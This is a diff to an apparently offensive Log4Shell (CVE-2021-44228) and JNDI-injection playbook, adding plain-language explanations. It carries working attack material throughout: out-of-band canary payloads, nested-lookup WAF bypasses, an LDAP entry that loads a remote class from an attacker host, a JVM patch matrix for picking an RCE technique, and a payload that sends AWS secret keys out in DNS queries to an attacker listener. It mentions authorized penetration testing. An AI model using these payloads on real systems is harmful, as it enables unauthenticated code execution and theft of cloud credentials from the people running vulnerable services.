@@ -11,6 +11,8 @@
 
 ## Read this first — why one string became the decade's worst bug
 
+> *In plain words — the anchor for this whole class:* JNDI is Java's **"look this name up and bring me back the thing it points to"** service — like calling directory assistance, giving a name, and being connected to whatever number they have on file. The bug: **you** get to supply the name, so you say "look up `ldap://my-server/evil`." Java dutifully phones *your* server, your server hands back a booby-trapped object, and Java **builds and runs it** — code execution. Log4Shell made it apocalyptic because Log4j would perform that lookup on **anything it wrote to a log file** (`${jndi:…}` inside a User-Agent, a username, a header) — so the attacker never even has to reach the lookup directly; they just get their string *logged.* And you don't need a shell to win: a single **DNS ping back to your listener** proves Java made the call = confirmed.
+
 JNDI (Java Naming and Directory Interface) resolves a **name** into a **Java object** via a backend — LDAP, RMI, DNS, IIOP. If an attacker controls the lookup name, they point the victim JVM at **their own** LDAP/RMI server, which returns a **malicious object**; the JVM fetches/instantiates/deserializes it and **runs attacker code**. That is JNDI injection, and it has existed since 2016.
 
 **Log4Shell (CVE-2021-44228)** made it catastrophic: Log4j's message **lookup** feature evaluated `${jndi:ldap://attacker/x}` inside *anything it logged* — a `User-Agent`, a username, a header. So **any logged, attacker-influenced string** on a vulnerable Java app became **unauthenticated RCE**, with zero authentication and (thanks to logging) an enormous, unexpected attack surface.
@@ -101,6 +103,8 @@ Generic Java      any app doing InitialContext.lookup(userInput) — JMS, RMI re
 
 # 3. Where to inject (the surface is huge because it's whatever gets logged)
 
+> *In plain words:* the attack surface isn't "inputs the app processes" — it's "inputs the app **writes down.**" A failed-login username, a 404'd URL path, a weird header a proxy logs verbatim — all get scribbled into a log, and if a vulnerable Log4j writes that line, your payload fires. That's why the bug so often hides in a header nobody thinks about (`X-Api-Version`, some custom `X-*`): spray a uniquely-tagged canary into *everything* and let the callback tell you which one was logged.
+
 Anything the app **logs** or passes to a **lookup** is a candidate. Spray a per-input token into **all** of these:
 ```
 HEADERS (the classic — logged verbatim by countless apps/WAFs/proxies):
@@ -120,6 +124,9 @@ INDIRECT / SECOND-ORDER:
 # PART II — DETECTION (out-of-band, blind-first)
 
 # 4. The canary probe (DNS-first, OOB-confirmed)
+
+> *In plain words:* you send a payload whose only job is to make the server **phone home** to a listener you own — and because Java looks up the DNS name *before* it even opens the connection, a plain DNS ping already proves your string was evaluated by a live sink. That DNS hit, carrying your unique token, **is the finding** — a blind proof of unauthenticated RCE, even though you never ran a command or saw a response. Reflection of `${jndi:…}` on the page proves nothing; the callback proves everything.
+
 
 ```
 Baseline payload:   ${jndi:ldap://<TOKEN>.<your-oob-host>/a}
@@ -147,6 +154,8 @@ This is how `log4j-scan` and `poc/jndi_probe.py` work: one request per input, ea
 ---
 
 # 6. WAF / filter bypass — nested lookup obfuscation
+
+> *In plain words:* a WAF that blocks the literal text `${jndi:` is matching a *word* — so you never spell the word. Log4j resolves inner `${…}` pieces first, so `${lower:j}` becomes `j`, `${::-n}` becomes `n`, and the engine reassembles `jndi` at runtime *after* the WAF already waved it through. The block is a spelling filter, not a wall; you just spell the same word out of Lego bricks the filter doesn't recognise.
 
 Log4j evaluates **nested** `${…}` lookups, so you can rebuild the word `jndi` (and the protocol) from sub-lookups that no signature matches:
 ```
@@ -180,6 +189,8 @@ iiop://    CORBA/IIOP — niche; occasionally the only unblocked path on old app
 
 # 8. The three RCE delivery techniques (choose by the JVM's patch state, §9)
 
+> *In plain words:* the callback proved Java *phoned your server*; now your server has to hand back something that runs. There are three ways, and which one works depends on how patched the JVM is. **(A)** the oldest, easiest — "here's a URL, download this class and run it" (only old JVMs still trust that). **(B)** hand back a booby-trapped *serialized object* that detonates a gadget already on the target (works even when A is blocked — this is the Deserialization kit's territory). **(C)** the modern bypass — build the exploit entirely out of classes *already installed* on the target (Tomcat's `BeanFactory` + an expression), so nothing needs to be downloaded or deserialized. Modern JDK → try C, then B; ancient appliance → A gives the fastest shell.
+
 **(A) Remote codebase (classic, OLD JVMs only):** the LDAP referral points at a remote factory class over HTTP; the JVM downloads and runs it.
 ```
 LDAP entry: javaClassName=Exploit; javaCodeBase=http://attacker/; javaFactory=Exploit; objectClass=javaNamingReference
@@ -205,9 +216,11 @@ Veracode/@welk1n/rogue-jndi automate this ("JNDIExploit", "rogue-jndi", "JNDI-In
 # 9. The JVM mitigation & version matrix (decides technique + severity)
 
 ```
-com.sun.jndi.ldap.object.trustURLCodebase / .rmi.object.trustURLCodebase:
+com.sun.jndi.ldap.object.trustURLCodebase   (the LDAP path — the one Log4Shell uses):
    default TRUE   → JDK ≤ 8u181 / 7u191 / 6u201 / 11.0.0     → REMOTE codebase (technique A) works → easy RCE.
    default FALSE  → JDK ≥ 8u191 / 7u201 / 6u211 / 11.0.1 (Oct 2018) → A blocked; use B (serialized) or C (BeanFactory/EL).
+com.sun.jndi.rmi.object.trustURLCodebase    (the RMI path — disabled EARLIER, don't assume Oct-2018):
+   default FALSE  → JDK ≥ 8u121 / 7u131 / 6u141 (Jan 2017)   → RMI remote-codebase A blocked since 2017; LDAP stayed open ~2 more years.
 Log4j lookup state (§2): ≤2.14.1 full · 2.15 localhost+exfil · 2.16 no-lookups · 2.17+ safe.
 Note: many real targets run OLD embedded JVMs (network appliances, legacy app servers) → technique A still lands.
 ```
@@ -233,6 +246,8 @@ RCE DELIVERY (authorized pentest/lab only — NOT shipped here; use the establis
 ---
 
 # 11. Secret / env-var exfiltration via lookups (data theft WITHOUT RCE — works on 2.15!)
+
+> *In plain words:* even when the site "patched" enough to stop code execution, Log4j often still *resolves* lookups — so you hide a second lookup **inside the hostname** you make it phone. `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.your-oob/}` first expands the env-var to the actual secret, then uses it as the DNS name it looks up — so the secret walks straight out the door as a DNS query to your listener. No code runs; the cloud keys still land in your lap. This is why "we're on 2.15, we're fine" is wrong.
 
 Log4j's lookups resolve `${env:…}`, `${sys:…}`, `${main:…}`, `${docker:…}`, `${k8s:…}` — nest them **inside** the JNDI host so the secret is exfiltrated in the **DNS query**:
 ```
